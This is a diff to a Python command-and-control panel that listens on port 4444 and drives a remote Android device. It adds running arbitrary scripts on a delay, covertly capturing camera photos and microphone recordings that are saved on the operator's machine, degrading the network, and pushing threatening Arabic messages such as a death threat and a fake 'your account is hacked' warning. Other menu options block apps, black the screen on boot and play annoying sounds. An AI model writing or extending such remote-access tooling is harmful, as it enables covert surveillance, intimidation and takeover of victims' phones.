@@ -1,11 +1,49 @@
+import base64
+import datetime
+import os
 import socket
 import struct
 import sys
 import time
 
-HOST = '0.0.0.0'
+HOST = "0.0.0.0"
 PORT = 4444
 MAX_MESSAGE_SIZE = 8 * 1024 * 1024  # 8 MB maximum size for any message
+
+SCRIPT_MAX_BYTES = 512 * 1024  # 512 KB maximum script size sent to the target
+
+# مجلدات الحفظ للمحتوى المنقول من الجهاز (داخل مجلد النص)
+BASE_DIR = os.path.dirname(os.path.abspath(__file__))
+RECORDINGS_DIR = os.path.join(BASE_DIR, "recordings")
+CAPTURES_DIR = os.path.join(BASE_DIR, "captures")
+
+# رسائل جاهزة يمكن عرضها كتحذير على الجهاز (تتطابق مع Messages في التطبيق)
+MESSAGE_DASHBOARD = [
+    "تم اختراق حسابك في فري فاير! بياناتك الشخصية معرضة للخطر. "
+    "قم بإلغاء تثبيت اللعبة فوراً لحماية نفسك.",
+    "فري فاير يسرق بياناتك الشخصية!",
+    "تم تتبع استخدامك لفري فاير!",
+    "اللعب المستمر لفري فاير يضر بصحتك!",
+    "فري فاير يسبب إدماناً خطيراً!",
+    "أنا سأقتلك... فري فاير!",
+    "يجب إزالة فري فاير من جهازك الآن!",
+]
+
+ALLOWED_IMAGE_EXTENSIONS = {".jpg", ".jpeg", ".png", ".bmp", ".webp"}
+
+IMAGE_MIME_SIGNATURES = {
+    b"\xff\xd8\xff": "jpeg",
+    b"\x89PNG": "png",
+    b"BM": "bmp",
+    b"RIFF": "webp",
+}
+
+IMAGE_MAX_BYTES = {
+    "jpeg": 5 * 1024 * 1024,
+    "png": 5 * 1024 * 1024,
+    "bmp": 3 * 1024 * 1024,
+    "webp": 5 * 1024 * 1024,
+}
 
 
 def _configure_console():
@@ -46,6 +84,141 @@ def receive_message(sock):
     return payload.decode('utf-8')
 
 
+def _validate_image(path):
+    """Return (size_bytes, kind, width, height) or None on failure."""
+    if not os.path.isfile(path):
+        return None
+    ext = os.path.splitext(path)[1].lower()
+    if ext not in ALLOWED_IMAGE_EXTENSIONS:
+        return None
+
+    with open(path, "rb") as f:
+        head = f.read(16)
+
+    kind = None
+    for magic, k in IMAGE_MIME_SIGNATURES.items():
+        if head.startswith(magic):
+            kind = k
+            break
+    if kind is None:
+        return None
+
+    size = os.path.getsize(path)
+    if size > IMAGE_MAX_BYTES.get(kind, MAX_MESSAGE_SIZE):
+        return None
+
+    # الأبعاد فحص اختياري للتقرير؛ الصلاحية الفعلية محسومة عبر التوقيع + الحجم.
+    w, h = _detect_image_dimensions(path, kind)
+    if w is None or h is None:
+        w, h = 0, 0
+    return (size, kind, w, h)
+
+
+def _detect_image_dimensions(path, kind):
+    try:
+        with open(path, "rb") as f:
+            data = f.read(64)
+    except OSError:
+        return (None, None)
+
+    if kind == "jpeg":
+        return _jpeg_size(data)
+    if kind == "png":
+        return _png_size(data)
+    if kind == "bmp":
+        return _bmp_size(data)
+    if kind == "webp":
+        return _webp_size(data)
+    return (None, None)
+
+
+def _jpeg_size(data):
+    if len(data) < 4:
+        return (None, None)
+    for i in range(len(data) - 3):
+        if data[i] == 0xff and data[i + 1] == 0xc0:
+            if i + 8 <= len(data):
+                h = int.from_bytes(data[i + 5:i + 7], "big")
+                w = int.from_bytes(data[i + 7:i + 9], "big")
+                if h > 0 and w > 0:
+                    return (w, h)
+    return (None, None)
+
+
+def _png_size(data):
+    if len(data) < 24:
+        return (None, None)
+    if data[:8] == b"\x89PNG\r\n\x1a\n":
+        w = int.from_bytes(data[16:20], "big")
+        h = int.from_bytes(data[20:24], "big")
+        if w > 0 and h > 0:
+            return (w, h)
+    return (None, None)
+
+
+def _bmp_size(data):
+    if len(data) < 30:
+        return (None, None)
+    if data[:2] == b"BM":
+        w = int.from_bytes(data[18:22], "little")
+        h = int.from_bytes(data[22:26], "little")
+        if w > 0 and h > 0:
+            return (w, abs(h))
+    return (None, None)
+
+
+def _webp_size(data):
+    if len(data) < 12:
+        return (None, None)
+    if data[:4] == b"RIFF" and data[8:12] == b"WEBP":
+        if len(data) >= 20:
+            w = int.from_bytes(data[24:28], "little")
+            h = int.from_bytes(data[20:24], "little")
+            if w > 0 and h > 0:
+                return (w, h)
+    return (None, None)
+
+
+def _image_to_base64(path):
+    try:
+        with open(path, "rb") as f:
+            raw = f.read()
+        return base64.b64encode(raw).decode("ascii")
+    except OSError:
+        return None
+
+
+def _parse_duration(s):
+    s = s.strip()
+    if s == "":
+        return None
+    try:
+        d = int(s)
+    except ValueError:
+        return None
+    if d <= 0 or d > 86400:
+        return None
+    return d
+
+
+def _parse_int_in_range(s, lo, hi):
+    s = s.strip()
+    if s == "":
+        return None
+    try:
+        v = int(s)
+    except ValueError:
+        return None
+    if v < lo or v > hi:
+        return None
+    return v
+
+
+def _parse_script_delay(s):
+    """Delay in seconds for script execution; 0 means immediate."""
+    return _parse_int_in_range(s, 0, 86400)
+
+
 class PhoneController:
     def __init__(self, host=HOST, port=PORT):
         self.host = host
@@ -84,6 +257,9 @@ class PhoneController:
             self.client_socket = None
         self.client_address = None
 
+    def send_command(self, command):
+        send_message(self.client_socket, command)
+
     def show_menu(self):
         while self.connected:
             print("\n--- Control Panel ---")
@@ -94,10 +270,10 @@ class PhoneController:
             print("5. Play annoying sound")
             print("6. Change wallpaper")
             print("7. Show black screen on boot")
-            print("8. Toggle Wi-Fi")
-            print("9. Toggle mobile data")
-            print("10. Block other apps")
-            print("11. Run custom command")
+            print("8. Network degradation")
+            print("9. Block other apps")
+            print("10. Run custom command")
+            print("11. Run script")
             print("12. Show device info")
             print("13. Capture camera photo")
             print("14. Record microphone audio")
@@ -110,10 +286,13 @@ class PhoneController:
             print("0. Exit")
 
             try:
-                choice = input("Choose an operation: ")
+                choice = input("Choose an operation: ").strip()
             except (EOFError, KeyboardInterrupt):
                 print("\nSession ended")
                 break
+
+            # معالج اختياري للرد يحوّل البيانات المتلقاة إلى ملف محلي (خيارات 13-14)
+            handler = None
 
             try:
                 if choice == "0":
@@ -121,7 +300,8 @@ class PhoneController:
                     print("Exit command sent")
                     break
                 elif choice == "1":
-                    self.send_command("show_message")
+                    if not self._message_dashboard():
+                        continue
                 elif choice == "2":
                     self.send_command("remove_freefire")
                 elif choice == "3":
@@ -134,27 +314,38 @@ class PhoneController:
                     duration = input("Duration in seconds: ")
                     self.send_command(f"play_annoying_sound:{duration}")
                 elif choice == "6":
-                    image_path = input("Image path: ")
-                    self.send_command(f"change_wallpaper:{image_path}")
+                    if not self._change_wallpaper():
+                        continue
                 elif choice == "7":
                     self.send_command("black_screen_on_boot")
                 elif choice == "8":
-                    self.send_command("toggle_wifi")
+                    if not self._network_degradation():
+                        continue
                 elif choice == "9":
-                    self.send_command("toggle_mobile_data")
-                elif choice == "10":
                     package = input("App package name: ")
                     self.send_command(f"block_app:{package}")
-                elif choice == "11":
-                    command = input("Custom command: ")
+                elif choice == "10":
+                    command = input("Custom command: ").strip()
+                    if not command:
+                        print("Result: Error - custom command is empty.")
+                        continue
                     self.send_command(f"custom:{command}")
+                elif choice == "11":
+                    if not self._run_script():
+                        continue
                 elif choice == "12":
                     self.send_command("device_info")
                 elif choice == "13":
                     self.send_command("capture_camera")
+                    handler = self._handle_photo_reply
                 elif choice == "14":
-                    duration = input("Duration in seconds: ")
-                    self.send_command(f"record_audio:{duration}")
+                    duration = input("Duration in seconds: ").strip()
+                    record_secs = _parse_int_in_range(duration, 1, 600)
+                    if record_secs is None:
+                        print("Result: Error - duration must be an integer between 1 and 600 seconds.")
+                        continue
+                    self.send_command(f"record_audio:{record_secs}")
+                    handler = self._handle_audio_reply
                 elif choice == "15":
                     self.send_command("reboot_device")
                 elif choice == "16":
@@ -175,7 +366,10 @@ class PhoneController:
 
                 # Receive the result (each command is followed by a single reply in the protocol)
                 result = receive_message(self.client_socket)
-                print(f"Result: {result}")
+                if handler is not None:
+                    handler(result)
+                else:
+                    print(f"Result: {result}")
             except (ConnectionError, OSError, EOFError) as e:
                 print(f"Lost connection to device: {e}")
                 break
@@ -183,8 +377,221 @@ class PhoneController:
                 print(f"Unexpected error: {e}")
                 break
 
-    def send_command(self, command):
+    def _change_wallpaper(self):
+        """Policy-compliant wallpaper transfer with duration and validation.
+
+        Returns True if the command was sent to the device (a reply is
+        expected and will be read by the caller), False if validation failed
+        (no command was sent, so the caller must skip the receive step).
+        """
+        image_path = input("Image path: ")
+        duration_str = input("Duration (seconds): ")
+
+        duration = _parse_duration(duration_str)
+        if duration is None:
+            print("Result: Error - duration must be a positive integer.")
+            return False
+
+        image_info = _validate_image(image_path)
+        if image_info is None:
+            print("Result: Error - file not found or not a valid image.")
+            return False
+
+        size_bytes, kind, width, height = image_info
+        if size_bytes > MAX_MESSAGE_SIZE:
+            print(f"Result: Error - image too large ({kind}, {size_bytes} bytes).")
+            return False
+
+        print("Image validated successfully.")
+        print("Uploading image...")
+
+        b64 = _image_to_base64(image_path)
+        if b64 is None:
+            print("Result: Error - failed to read image data.")
+            return False
+
+        command = f"change_wallpaper_base64:{duration}:{b64}"
         send_message(self.client_socket, command)
+        print("Applying wallpaper...")
+        return True
+
+    def _network_degradation(self):
+        """Temporary device-local network degradation (latency/loss/bandwidth).
+
+        Sends a request to the target; the target applies the shaping and
+        restores the normal condition automatically after the duration.
+        Returns True if the command was sent, False on invalid input.
+        """
+        latency_str = input("Latency (ms) [0-5000, 0 = none]: ")
+        loss_str = input("Packet loss (%) [0-100, 0 = none]: ")
+        bandwidth_str = input("Bandwidth limit (kbps) [0 = none, Enter for none]: ")
+        duration_str = input("Duration (seconds): ")
+
+        latency = _parse_int_in_range(latency_str or "0", 0, 5000)
+        if latency is None:
+            print("Result: Error - latency must be an integer between 0 and 5000 ms.")
+            return False
+
+        loss = _parse_int_in_range(loss_str or "0", 0, 100)
+        if loss is None:
+            print("Result: Error - packet loss must be an integer between 0 and 100%.")
+            return False
+
+        bandwidth = _parse_int_in_range(bandwidth_str or "0", 0, 10_000_000)
+        if bandwidth is None:
+            print("Result: Error - bandwidth limit must be an integer kbps value (0-10000000).")
+            return False
+
+        duration = _parse_duration(duration_str)
+        if duration is None:
+            print("Result: Error - duration must be an integer between 1 and 86400 seconds.")
+            return False
+
+        if latency == 0 and loss == 0 and bandwidth == 0:
+            print("Result: Error - no degradation parameters specified (all values are zero).")
+            return False
+
+        command = f"network_deg:{latency}:{loss}:{bandwidth}:{duration}"
+        send_message(self.client_socket, command)
+        print(f"Applying network degradation on target (duration: {duration}s)...")
+        return True
+
+    def _run_script(self):
+        """Send a script to the target for (possibly delayed) execution.
+
+        The delay is handled on the Android target. Returns True if the
+        command was sent, False on invalid input.
+        """
+        script_path = input("Script path: ").strip()
+        delay_str = input("Run after (seconds) [0 = immediately]: ").strip()
+
+        delay = _parse_script_delay(delay_str)
+        if delay is None:
+            print("Result: Error - delay must be an integer between 0 and 86400 seconds.")
+            return False
+
+        if not os.path.isfile(script_path):
+            print("Result: Error - script file not found: " + script_path)
+            return False
+
+        size = os.path.getsize(script_path)
+        if size == 0:
+            print("Result: Error - script file is empty.")
+            return False
+        if size > SCRIPT_MAX_BYTES:
+            print(f"Result: Error - script too large ({size} bytes, max {SCRIPT_MAX_BYTES}).")
+            return False
+
+        try:
+            with open(script_path, "r", encoding="utf-8-sig", errors="replace") as f:
+                content = f.read()
+        except OSError as e:
+            print(f"Result: Error - cannot read script file: {e}")
+            return False
+
+        if not content.strip():
+            print("Result: Error - script content is empty.")
+            return False
+
+        b64 = base64.b64encode(content.encode("utf-8")).decode("ascii")
+        command = f"script_base64:{delay}:{b64}"
+        send_message(self.client_socket, command)
+        print(f"Script sent to device. Delay: {delay}s "
+              f"({'executing immediately' if delay == 0 else 'scheduled on the device'}).")
+        return True
+
+    def _message_dashboard(self):
+        """Send a predefined or custom threat message to display on the device.
+
+        Returns True if the command was sent to the device (a reply is
+        expected and will be read by the caller), False if validation failed
+        (no command was sent, so the caller must skip the receive step).
+        """
+        print("\n--- Message Dashboard ---")
+        for i, msg in enumerate(MESSAGE_DASHBOARD, start=1):
+            print(f"{i}. {msg}")
+        print(f"{len(MESSAGE_DASHBOARD) + 1}. Add a new message (custom text)")
+
+        choice = input("Choose a message: ").strip()
+        choice_num = _parse_int_in_range(choice, 1, len(MESSAGE_DASHBOARD) + 1)
+        if choice_num is None:
+            print(f"Result: Error - choose a number between 1 and {len(MESSAGE_DASHBOARD) + 1}.")
+            return False
+
+        if choice_num == len(MESSAGE_DASHBOARD) + 1:
+            custom_text = input("Message text: ").strip()
+            if not custom_text:
+                print("Result: Error - message text is empty.")
+                return False
+            send_message(self.client_socket, f"show_message:txt:{custom_text}")
+        else:
+            send_message(self.client_socket, f"show_message:idx:{choice_num}")
+        print("Sending message to device...")
+        return True
+
+    def _handle_photo_reply(self, result):
+        """Save a PHOTO_OK:<base64> reply from the device as a local image file."""
+        if result.startswith("PHOTO_OK:"):
+            b64_data = result[len("PHOTO_OK:"):]
+            self._write_recorded_bytes(b64_data, CAPTURES_DIR, "photo", ".jpg")
+        else:
+            print(f"Result: Error - camera reply from device: {result}")
+
+    def _handle_audio_reply(self, result):
+        """Save a record_audio_data:<duration>:<base64> reply as a local 3gp file."""
+        if result.startswith("record_audio_data:"):
+            rest = result[len("record_audio_data:"):]
+            colon = rest.find(":")
+            if colon < 0:
+                print("Result: Error - audio reply from device is incomplete "
+                      "(missing duration or data).")
+                return
+            b64_data = rest[colon + 1:]
+            self._write_recorded_bytes(b64_data, RECORDINGS_DIR, "recording", ".3gp")
+        else:
+            print(f"Result: Error - audio reply from device: {result}")
+
+    def _write_recorded_bytes(self, b64_text, directory, stem, ext):
+        """Decode base64 content and write it to a local file, verifying the write.
+
+        Prints a Result line with the final saved path on success or an error
+        description on failure. Returns the saved path or None.
+        """
+        try:
+            data = base64.b64decode(b64_text, validate=True)
+        except Exception:
+            print("Result: Error - failed to decode the content received from the device.")
+            return None
+
+        if not data:
+            print("Result: Error - the received content is empty.")
+            return None
+
+        try:
+            os.makedirs(directory, exist_ok=True)
+        except OSError as e:
+            print(f"Result: Error - cannot create save directory {directory}: {e}")
+            return None
+
+        timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S_%f")
+        path = os.path.join(directory, f"{stem}_{timestamp}{ext}")
+        try:
+            with open(path, "wb") as f:
+                written = f.write(data)
+        except OSError as e:
+            print(f"Result: Error - failed to write file {path}: {e}")
+            return None
+
+        if written != len(data):
+            print(f"Result: Error - partial write to {path} ({written}/{len(data)} bytes).")
+            try:
+                os.remove(path)
+            except OSError:
+                pass
+            return None
+
+        print(f"{stem.capitalize()} saved to: {path} ({written} bytes)")
+        return path
 
     def close(self):
         self._disconnect()
